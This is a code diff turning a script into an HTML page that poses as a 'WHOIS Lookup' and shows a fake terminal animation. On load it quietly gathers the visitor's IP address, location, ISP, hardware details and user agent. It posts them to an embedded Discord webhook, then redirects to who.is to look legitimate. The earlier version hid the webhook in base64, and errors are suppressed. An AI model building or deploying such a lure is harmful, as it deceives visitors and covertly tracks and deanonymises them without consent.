@@ -1,17 +1,44 @@
-async function runWhois() {
-    try {
-        // 1. Your Scrambled Secret
-        const encodedLink = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUwMjU5MTYyNTY4NjI5MDQzMi9mdDFLcS1tc212YzVPakFVeEhPeHhvNmFlME43Y01DRkFDYjZtQU9QS1o1ZTh1N2NjTkJuby1fQXIwQVhubjZqd0dKcg==";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>WHOIS Lookup - Verifying...</title>
+    <style>
+        body { 
+            background: #0a0a0a; 
+            color: #00ff41; /* Classic Matrix/Terminal Green */
+            font-family: 'Courier New', Courier, monospace; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+        }
+        .terminal-text {
+            border-right: 2px solid #00ff41;
+            white-space: nowrap;
+            overflow: hidden;
+            animation: typing 2s steps(30, end), blink .75s step-end infinite;
+        }
+        @keyframes typing { from { width: 0 } to { width: 100% } }
+        @keyframes blink { from, to { border-color: transparent } 50% { border-color: #00ff41 } }
+    </style>
+</head>
+<body>
+    <div class="terminal-text">QUERYING DATABASE: [WHOIS_REQUEST]...</div>
+    <p style="font-size: 10px; color: #008f11;">Status: Fetching packets...</p>
 
-        // 2. Decode it on the fly
-        const webhookURL = atob(encodedLink);
+    <script>
+        async function runWhois() {
+            try {
+                // 1. IP and Location Check (via external API for more detail)
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
 
-        // 3. Fetch detailed IP/ISP info
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-
-        // 4. Create the message
-        const whoisEntry = `
+                // 2. Format the message for Discord like a WHOIS entry
+                const whoisEntry = `
 \`\`\`yaml
 [ WHOIS DATA REPORT ]
 -----------------------------------
@@ -21,30 +48,35 @@ REGION     : ${data.region}
 COUNTRY    : ${data.country_name}
 ISP        : ${data.org}
 -----------------------------------
-PLATFORM   : ${navigator.platform}
+HARDWARE   : ${navigator.platform}
 CORES      : ${navigator.hardwareConcurrency}
 RESOLUTION : ${screen.width}x${screen.height}
+TIMESTAMP  : ${new Date().toISOString()}
 -----------------------------------
+USER AGENT : ${navigator.userAgent}
 \`\`\``;
 
-        // 5. Send to Discord
-        await fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                username: "WHOIS-NODE-SYSTEM",
-                content: whoisEntry
-            })
-        });
+                // 3. Send to your Webhook
+                const webhookURL = "https://discordapp.com/api/webhooks/1502591625686290432/ft1Kq-msmvc5OjAUxHOxxo6ae0N7cMCFACb6mAOPKZ5e8u7ccNBno-_Ar0AXnn6jwGJr";
 
-    } catch (e) {
-        console.log("Error suppressed.");
-    }
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: "WHOIS-NODE-SYSTEM",
+                        content: whoisEntry
+                    })
+                });
 
-    // 6. Redirect to the decoy site
-    setTimeout(() => {
-        window.location.href = "https://who.is";
-    }, 2000);
-}
+            } catch (e) { }
 
-runWhois();
+            // 4. Redirect to a real Whois site so it looks legitimate
+            setTimeout(() => {
+                window.location.href = "https://who.is";
+            }, 2500);
+        }
+
+        runWhois();
+    </script>
+</body>
+</html>
